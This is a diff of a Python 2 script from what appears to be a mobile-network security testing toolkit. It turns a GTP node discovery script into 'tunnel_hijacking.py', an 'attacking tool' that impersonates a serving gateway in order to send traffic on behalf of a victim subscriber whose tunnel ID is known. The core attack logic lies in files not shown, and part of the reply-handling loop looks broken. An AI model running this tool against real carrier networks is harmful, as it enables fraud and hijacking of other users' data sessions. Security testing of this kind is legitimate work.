@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # encoding: utf-8
-#      discover_gtp_nodes.py
+#       tunnel_hijacking.py
 #       
 #       Copyright 2018 Rosalia d'Alessandro 
 #                     
@@ -32,46 +32,46 @@
 #       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 #       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
-
 import os
 import sys
 from optparse import OptionParser
 from gtp_v2_core.utilities.configuration_parser import parseConfigs
-
 from commons.message_handler import MessageHandler
-
 from commons.globals import message_queue
-
 
 __all__ = []
 __version__ = 0.1
 
+
+GTP_PORT = 2123
 DEFAULT_MSG_FREQ = 20
 DEFAULT_SLEEPTIME = 1
 DEBUG = 0
+
 
 ##
 ## ATTACKING TOOL 
 ## 
 ## @brief      Main file to execute the script.
 ## 
-## This file can discover gtp nodes sending several messages like:
-## - echo requests
-## - create session request
-## - delete session request with random TEIDs or TEID set to zero
-## ¯ delete bearer request  
+## This script can be used to test Fraud scenario, replacing the legitimate S-GW 
+## with a malicious S-GW able to send GTP-U traffic on the behalf of the user
+## victim.
+##  Prerequirement: TEID of the tunnel assigned to the victim user shall be 
+##  known and provided and provided in the config file.
+## 
 ## Use the -h option to enter the help menu and determine what to do.
 ## 
 ## Basic usage examples:
-##      * $ python discover_gtp_nodes.py -v -c conf_file.cnf [-c conf2.cnf ...] 
-##        -r <remote ip> 
-#         act as a client connecting to <remote-host-ip>
+##      * $ python tunnel_hijacking.py -v -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip> 
+#            act as a client connecting to <remote-host-ip>
 ##      
-##      * $ python discover_gtp_nodes.py -lv  -c conf_file.cnf [-c conf2.cnf ...] 
-##        -r <remote ip>      
-##        act as a server listening on 0.0.0.0 and accepting replies from 
-##        <remote-host-ip>
-## Example configuration file: EchoRequest.cnf, DeleteSession.cnf, DeleteBearer.cnf
+##      * $ python tunnel_hijacking.py -lv  -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip>
+##      
+##           act as a server listening on 0.0.0.0 and accepting replies from <remote-host-ip>
+##
+## Example configuration file: TunnelHijack.cnf
+
 
 def main(argv=None):
     '''Command line options.'''
@@ -100,14 +100,13 @@ def main(argv=None):
                           action = "count", help = "start also a GTP_C listener")       
         
         # set defaults
-        parser.set_defaults(listening_mode=False, 
-                            config_file="../config/GTPNodesDiscovery.cnf", 
-                            verbose = 0)
+        parser.set_defaults(listening_mode=False,
+                            config_file="../config/TunnelHijack.cnf", 
+                            verbose = False)
 
         # process options
         (opts, args) = parser.parse_args(argv)
-        is_verbose = opts.verbose
-        
+        is_verbose = False
         listening_mode = opts.listening_mode
           
 
@@ -126,30 +125,26 @@ def main(argv=None):
         config = parseConfigs(opts.config_file)
  
         msgs = config.get_unpacked_messages()
-        port = config.get_gtp_port()
-        
+       
         lstn = MessageHandler(messages = msgs, peer = remote_net, 
                               isVerbose = is_verbose, 
                               listening_mode = listening_mode,
-                              msgs_freq = msg_freq, wait_time = sleep_time,
-                              port = port)  
+                              msgs_freq = msg_freq, wait_time = sleep_time)  
         if lstn : 
             lstn.daemon = True
             lstn.start()
             lstn.join()
             lstn.stop()
-        print "Sent %d GTPV%d messages"%(len(message_queue), config.get_version())
+        print "Sent %d GTPV2 messages"%len(message_queue)
         if not listening_mode :
             return
-        count = 0
+#Remote TEID represents the new TEID used by the PGW.
         for key, value in message_queue.items():
-            if value['reply'] == 1:
-                print "%s implements a GTP v2 stack"%key
-                count += 1
-        if count > 0 :
-            print "Found in total %d targets implemeting a GTP v2 stack"%count
-        else :
-            print "Not found targets implemeting a GTP v2 stack"        
+            for k, v in value:
+                if v['reply'] == 1:
+                    print "%s implements a GTP v2 stack"%key
+                    print "%d msg type teid %d"%(k, v['remote_teid'])    
+   
     except Exception, e:
         indent = len(program_name) * " "
         sys.stderr.write(program_name + ": " + repr(e) + "\n")
